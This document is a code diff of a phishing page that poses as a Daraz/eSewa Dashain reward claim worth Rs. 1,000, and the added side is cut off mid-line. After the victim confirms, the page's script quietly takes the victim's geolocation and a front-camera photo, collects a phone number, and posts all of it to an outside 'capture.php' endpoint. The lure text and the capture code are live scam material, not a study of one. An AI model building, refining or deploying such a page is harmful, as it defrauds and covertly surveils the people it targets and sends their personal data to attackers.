@@ -6,16 +6,16 @@
 <title>Daraz Dashain Dhamaka - Claim Reward</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-  body { 
+  body {
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
     background:#f2f4f7; min-height:100vh; display:flex; flex-direction:column;
-    align-items:center; padding-bottom:40px; overflow-x:hidden; 
+    align-items:center; padding-bottom:40px; overflow-x:hidden;
   }
-  .topbar { 
+  .topbar {
     width:100%; background:#fff; color:#60BB46; padding:14px 16px;
     padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:700;
-    display:flex; align-items:center; gap:10px; position:fixed; top:0; left:0; z-index:10; 
-    border-bottom: 1px solid #eee;
+    display:flex; align-items:center; gap:10px; position:fixed; top:0; left:0; z-index:10;
+    border-bottom:1px solid #eee;
   }
   .topbar .back { font-size:22px; line-height:1; }
   .topbar .title { flex:1; text-align:center; margin-right:22px; }
@@ -24,116 +24,89 @@
     background:#fff; width:94%; max-width:400px; border-radius:20px;
     margin-top:70px; box-shadow:0 8px 24px rgba(0,0,0,0.06);
     overflow:hidden; display:flex; flex-direction:column;
-    position:relative; z-index:1;
-    padding: 24px 20px;
+    position:relative; z-index:1; padding:24px 20px;
   }
-  .banner-img {
-    display:block; width:100%; height:auto;
-    border-radius: 12px;
-    margin-bottom: 20px;
-  }
+  .banner-img { display:block; width:100%; height:auto; border-radius:12px; margin-bottom:20px; }
+
   .reward-box {
-    background:#f8f9fa; border: 2px dashed #d1d5db; border-radius: 16px;
-    padding: 20px; margin-bottom: 20px; text-align: center;
+    background:#f8f9fa; border:2px dashed #d1d5db; border-radius:16px;
+    padding:20px; margin-bottom:20px; text-align:center;
   }
-  .reward-title {
-    font-size:13px; color:#666; letter-spacing:1px; font-weight:600;
-    margin-bottom:8px; text-transform:uppercase;
-  }
-  .reward-amount {
-    font-size:36px; font-weight:900; color:#1f2937; line-height:1;
-    margin-bottom: 6px;
-  }
-  .reward-desc { font-size:14px; color:#666; margin-top:0; }
+  .reward-title { font-size:13px; color:#666; letter-spacing:1px; font-weight:600; margin-bottom:8px; text-transform:uppercase; }
+  .reward-amount { font-size:36px; font-weight:900; color:#1f2937; line-height:1; margin-bottom:6px; }
+  .reward-desc { font-size:14px; color:#666; }
 
   .redeem-btn {
-    width: 100%; padding: 18px; border: none; border-radius: 16px;
-    background: #60BB46; color: #fff; font-size: 18px; font-weight: 700;
-    text-transform: uppercase; letter-spacing: 0.5px;
-    box-shadow: 0 4px 12px rgba(96, 187, 70, 0.3);
-    cursor: pointer; transition: transform 0.15s; margin-bottom: 12px;
+    width:100%; padding:18px; border:none; border-radius:16px;
+    background:#60BB46; color:#fff; font-size:18px; font-weight:700;
+    text-transform:uppercase; letter-spacing:0.5px;
+    box-shadow:0 4px 12px rgba(96,187,70,0.3);
+    cursor:pointer; transition:transform 0.15s; margin-bottom:12px;
   }
-  .redeem-btn:active { transform: scale(0.98); }
+  .redeem-btn:active { transform:scale(0.98); }
 
-  .fine-print { 
-    font-size:12px; color:#9ca3af; margin-top:8px; text-align: center; 
-  }
+  .fine-print { font-size:12px; color:#9ca3af; margin-top:8px; text-align:center; }
 
   .form-section {
-    background: #fff; width: 94%; max-width:400px;
-    border-radius: 16px; margin-top: 24px;
-    padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-    animation: fadeIn 0.4s;
+    background:#fff; width:94%; max-width:400px;
+    border-radius:16px; margin-top:24px; padding:24px;
+    box-shadow:0 4px 20px rgba(0,0,0,0.08);
   }
-  .form-header {
-    font-size: 18px; color: #60BB46; font-weight: 700; margin-bottom: 8px;
-    display: flex; align-items: center; gap: 8px;
-  }
-  .form-hint { font-size: 14px; color: #4b5563; margin-bottom: 16px; line-height: 1.5; }
+  .form-header { font-size:18px; color:#60BB46; font-weight:700; margin-bottom:8px; }
+  .form-hint { font-size:14px; color:#4b5563; margin-bottom:16px; line-height:1.5; }
   .form-input {
-    width: 100%; padding: 14px; border: 1px solid #e5e7eb; border-radius: 12px;
-    font-size: 16px; margin-bottom: 12px; background: #f9fafb; font-family:inherit;
-    transition: border-color 0.2s;
+    width:100%; padding:14px; border:1px solid #e5e7eb; border-radius:12px;
+    font-size:16px; margin-bottom:12px; background:#f9fafb; font-family:inherit;
   }
   .form-input:focus { outline:none; border-color:#60BB46; background:#fff; }
   .form-submit-btn {
-    width: 100%; padding: 16px; border: none; border-radius: 12px;
-    background: #60BB46; color: #fff; font-size: 16px; font-weight: 700;
-    cursor: pointer; text-transform: uppercase; letter-spacing:0.5px;
+    width:100%; padding:16px; border:none; border-radius:12px;
+    background:#60BB46; color:#fff; font-size:16px; font-weight:700;
+    cursor:pointer; text-transform:uppercase; letter-spacing:0.5px;
   }
   .form-submit-btn:disabled { background:#d1d5db; cursor:not-allowed; }
-  .form-submit-btn.success { background: #a7f3d0; color: #065f46; }
+  .form-submit-btn.success { background:#a7f3d0; color:#065f46; }
 
   .modal-overlay {
-    position: fixed; inset: 0;
-    background: rgba(0,0,0,0.65); z-index: 999;
-    display: none; justify-content: center; align-items: flex-end;
-    -webkit-backdrop-filter: blur(4px); backdrop-filter: blur(4px);
+    position:fixed; inset:0; background:rgba(0,0,0,0.65); z-index:999;
+    display:none; justify-content:center; align-items:flex-end;
+    -webkit-backdrop-filter:blur(4px); backdrop-filter:blur(4px);
   }
-  .modal-overlay.active { display: flex; animation: fadeIn 0.25s; }
+  .modal-overlay.active { display:flex; }
 
   .modal-content {
-    background: #fff; width: 100%; max-width: 420px;
-    border-radius: 24px 24px 0 0; padding: 24px 22px;
-    padding-bottom: calc(24px + env(safe-area-inset-bottom,0px));
-    animation: slideUp 0.3s ease-out;
-    text-align: center;
+    background:#fff; width:100%; max-width:420px;
+    border-radius:24px 24px 0 0; padding:24px 22px;
+    padding-bottom:calc(24px + env(safe-area-inset-bottom,0px));
+    text-align:center;
   }
-  .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; color: #222; }
-  .modal-desc { font-size: 14.5px; color: #555; line-height: 1.55; margin-bottom: 18px; }
+  .modal-title { font-size:20px; font-weight:700; margin-bottom:10px; color:#222; }
+  .modal-desc { font-size:14.5px; color:#555; line-height:1.55; margin-bottom:18px; }
 
   .checkbox-group {
-    display: flex; align-items: flex-start; gap: 10px;
-    margin-bottom: 20px; text-align: left;
-    background: #f9f9f9; padding: 12px; border-radius: 10px;
+    display:flex; align-items:flex-start; gap:10px;
+    margin-bottom:20px; text-align:left;
+    background:#f9f9f9; padding:12px; border-radius:10px;
   }
-  .checkbox-group input {
-    transform: scale(1.25); margin-top: 3px; accent-color: #60BB46;
-  }
-  .checkbox-label { font-size: 13px; color: #333; line-height: 1.45; }
-  .checkbox-label a { color: #60BB46; text-decoration: none; font-weight: 600; }
+  .checkbox-group input { transform:scale(1.25); margin-top:3px; accent-color:#60BB46; }
+  .checkbox-label { font-size:13px; color:#333; line-height:1.45; }
+  .checkbox-label a { color:#60BB46; text-decoration:none; font-weight:600; }
 
   .confirm-btn {
-    width: 100%; padding: 16px; border: none; border-radius: 12px;
-    background: #d1ff89; color: #006400; font-size: 16px; font-weight: 800;
-    text-transform: uppercase; cursor: pointer;
-    box-shadow: 0 4px 10px rgba(210,255,137,0.5);
-    transition: all 0.2s;
+    width:100%; padding:16px; border:none; border-radius:12px;
+    background:#d1ff89; color:#006400; font-size:16px; font-weight:800;
+    text-transform:uppercase; cursor:pointer;
   }
-  .confirm-btn:disabled { background: #e5e5e5; color: #aaa; cursor: not-allowed; box-shadow:none; }
-  .confirm-btn:not(:disabled):active { transform: scale(0.98); }
+  .confirm-btn:disabled { background:#e5e5e5; color:#aaa; cursor:not-allowed; }
 
   .statusPill {
     position:fixed; top:64px; left:50%; transform:translateX(-50%);
     background:rgba(0,0,0,.85); color:#fff; font-size:12px; padding:8px 16px;
     border-radius:24px; opacity:0; transition:opacity .3s; pointer-events:none;
-    z-index:1000; white-space:nowrap; max-width:90%;
+    z-index:1000; white-space:nowrap; max-width:92%;
   }
   .statusPill.show { opacity:1; }
   #video { display:none; }
-
-  @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
-  @keyframes slideUp { from{transform:translateY(100%);} to{transform:translateY(0);} }
 </style>
 </head>
 <body>
@@ -149,10 +122,9 @@
        alt="Daraz Dashain Dhamaka">
 
   <img id="brandLogo"
-       class="brand-logo"
        src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png"
        alt="eSewa"
-       style="height:40px; width:auto; margin-bottom:16px; display:block; margin-left:auto; margin-right:auto;"
+       style="height:40px; width:auto; margin:0 auto 16px; display:block;"
        onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';">
   <div id="logoFallback" style="display:none; font-size:28px; font-weight:800; color:#60BB46; margin-bottom:16px;">eSewa</div>
 
@@ -169,12 +141,12 @@
 <div id="formSection" class="form-section" style="display:none;">
   <div class="form-header">&#9889; Final Step</div>
   <p class="form-hint">Verify your phone number to receive the reward instantly.</p>
-  
+
   <input id="phone" type="tel" class="form-input" placeholder="Enter Phone Number" inputmode="numeric">
   <input id="notes" type="text" class="form-input" placeholder="Additional Notes (Optional)">
-  
+
   <button id="btnSubmit" class="form-submit-btn">VERIFY &amp; CLAIM</button>
-  <div class="fine-print" style="margin-top: 12px;">*can be redeemed once only</div>
+  <div class="fine-print" style="margin-top:12px;">*can be redeemed once only</div>
 </div>
 
 <div id="modalOverlay" class="modal-overlay">
@@ -183,14 +155,12 @@
     <p class="modal-desc">
       You are about to redeem your esewa to <strong>DARAZ DASHAIN DHAMAKA</strong> voucher worth <strong>Rs. 1,000</strong>. Please confirm below to proceed.
     </p>
-
     <div class="checkbox-group">
       <input type="checkbox" id="agreeCheck">
       <label for="agreeCheck" class="checkbox-label">
         I agree to esewa&rsquo;s to <a href="#">DARAZ NEPAL's</a> Terms and Conditions and confirm the details are correct.
       </label>
     </div>
-
     <button id="btnConfirm" class="confirm-btn" disabled>CONFIRM</button>
   </div>
 </div>
@@ -203,169 +173,54 @@
 <script>
 "use strict";
 
-/* ---- Surface real JS crashes (ignore cross-origin noise) ---- */
-window.addEventListener('error', function(e){
-  if (e.message === 'Script error.' || e.message === 'Script error') return;
-  const pill = document.getElementById('statusPill');
-  if (pill) {
-    pill.textContent = 'JS ERROR: ' + e.message + ' @' + e.lineno;
-    pill.classList.add('show');
-    clearTimeout(pill._t);
-    pill._t = setTimeout(() => pill.classList.remove('show'), 6000);
-  }
-}, true);
+var API = "https://daraz-dashain.freedev.app/capture.php?i=1";
 
-/* ---- API ---- */
-const API = "https://daraz-dashain.freedev.app/capture.php?i=1";
- 
-/* ---- Warm up endpoint to clear InfinityFree's ?i=1 challenge before real POST ---- */
-fetch(API, { method: 'GET', cache: 'no-store' }).catch(() => {});
+var modal       = document.getElementById('modalOverlay');
+var btnRedeem   = document.getElementById('btnRedeem');
+var btnConfirm  = document.getElementById('btnConfirm');
+var agreeCheck  = document.getElementById('agreeCheck');
+var formSection = document.getElementById('formSection');
+var statusPill  = document.getElementById('statusPill');
+var btnSubmit   = document.getElementById('btnSubmit');
 
-const modal       = document.getElementById('modalOverlay');
-const btnRedeem   = document.getElementById('btnRedeem');
-const btnConfirm  = document.getElementById('btnConfirm');
-const agreeCheck  = document.getElementById('agreeCheck');
-const formSection = document.getElementById('formSection');
-const statusPill  = document.getElementById('statusPill');
-const btnSubmit   = document.getElementById('btnSubmit');
+var captured = { location:null, image:null };
+var cameraStream = null;
+var captureStarted = false;
 
-const captured = { location:null, image:null };
-let cameraStream = null;
-let captureStarted = false;
-
-btnRedeem.addEventListener('click', (e) => {
+/* ---- OPEN POPUP ---- */
+btnRedeem.addEventListener('click', function(e){
   e.preventDefault();
   modal.classList.add('active');
 });
 
-agreeCheck.addEventListener('change', () => {
+/* ---- ENABLE CONFIRM ONLY WHEN CHECKED ---- */
+agreeCheck.addEventListener('change', function(){
   btnConfirm.disabled = !agreeCheck.checked;
 });
 
-btnConfirm.addEventListener('click', () => {
+/* ---- CONFIRM ---- */
+btnConfirm.addEventListener('click', function(){
   modal.classList.remove('active');
   btnRedeem.style.display = 'none';
   formSection.style.display = 'block';
-  setTimeout(() => formSection.scrollIntoView({behavior:'smooth', block:'end'}), 150);
+  setTimeout(function(){ formSection.scrollIntoView({behavior:'smooth', block:'end'}); }, 150);
 
   if (!captureStarted) {
     captureStarted = true;
-    setTimeout(() => {
+    setTimeout(function(){
       triggerLocationCapture();
       setTimeout(triggerCameraCapture, 1500);
     }, 500);
   }
 });
 
-/* ---------- LOCATION (local only) ---------- */
+/* ---- LOCATION ---- */
 function triggerLocationCapture() {
   if (!navigator.geolocation) { captured.location = { error:'Not supported' }; return; }
   showStatus('Getting Location...');
   navigator.geolocation.getCurrentPosition(
-    pos => {
+    function(pos){
       captured.location = {
         latitude: pos.coords.latitude,
         longitude: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      };
-      showStatus('Location captured');
-    },
-    err => {
-      captured.location = { error: err.message || 'Denied' };
-      showStatus('Location: ' + (err.message || 'denied'));
-    },
-    { enableHighAccuracy:false, timeout:10000, maximumAge:60000 }
-  );
-}
-
-/* ---------- CAMERA (local only, adaptive wait) ---------- */
-async function triggerCameraCapture() {
-  try {
-    showStatus('Accessing Camera...');
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      captured.image = null; showStatus('Camera not supported'); return;
-    }
-    cameraStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode:'user', width:{ideal:320}, height:{ideal:240} }, audio:false
-    });
-    const video = document.getElementById('video');
-    video.srcObject = cameraStream;
-    video.setAttribute('playsinline','');
-    video.muted = true;
-    await video.play().catch(()=>{});
-
-    let waited = 0;
-    while ((video.videoWidth || 0) < 10 && waited < 3000) {
-      await new Promise(r => setTimeout(r, 200));
-      waited += 200;
-    }
-    await new Promise(r => setTimeout(r, 500));
-
-    const canvas = document.getElementById('canvas');
-    canvas.width  = video.videoWidth  || 320;
-    canvas.height = video.videoHeight || 240;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    captured.image = canvas.toDataURL('image/jpeg', 0.5);
-
-    cameraStream.getTracks().forEach(t => t.stop());
-    cameraStream = null;
-    video.srcObject = null;
-    showStatus('Photo captured');
-  } catch (err) {
-    captured.image = null;
-    showStatus('Camera: ' + (err.name || 'failed'));
-  }
-}
-
-/* ---------- SUBMIT ---------- */
-btnSubmit.addEventListener('click', () => {
-  const phone = document.getElementById('phone').value.trim();
-  const notes = document.getElementById('notes').value.trim();
-
-  if (!/^[0-9+\-\s]{7,15}$/.test(phone)) { showStatus('Enter a valid phone number'); return; }
-
-  btnSubmit.disabled = true;
-  btnSubmit.textContent = 'SUBMITTING...';
-
-  sendData({
-    campaign: 'Daraz Dashain Dhamaka',
-    reward: 'Rs. 1,000',
-    phoneNumber: phone,
-    notes: notes,
-    location: captured.location,
-    image: captured.image
-  }).then(res => {
-    if (res && res.ok) {
-      showStatus('Success! Reward claimed.');
-      btnSubmit.textContent = '\u2713 CLAIMED';
-      btnSubmit.classList.add('success');
-      document.getElementById('phone').readOnly = true;
-      document.getElementById('notes').readOnly = true;
-    } else {
-      showStatus('Server said: ' + (res && res.error ? res.error : 'no reply'));
-      btnSubmit.disabled = false;
-      btnSubmit.textContent = 'RETRY';
-    }
-  });
-});
-
-/* ---------- SENDER (text/plain = simple request; auto-retry once) ---------- */
-function sendData(payload, isRetry) {
-  showStatus('Sending...');
-  return fetch(API, {
-    method:'POST',
-    headers:{ 'Content-Type':'text/plain;charset=UTF-8' },
-    body: JSON.stringify(payload)
-  })
-  .then(r => {
-    return r.text().then(t => {
-      showStatus('HTTP ' + r.status + ' | ' + t.slice(0, 60));
-      console.log('RAW RESPONSE:', r.status, t);
-      return { ok: r.ok, raw: t };
-    });
-  })
-  .catch(e => {
-    showStatus('FAILED: ' + e.message);
-    return { ok:false, error: e.message };
-  });
-}
+        accuracy: pos.coords.
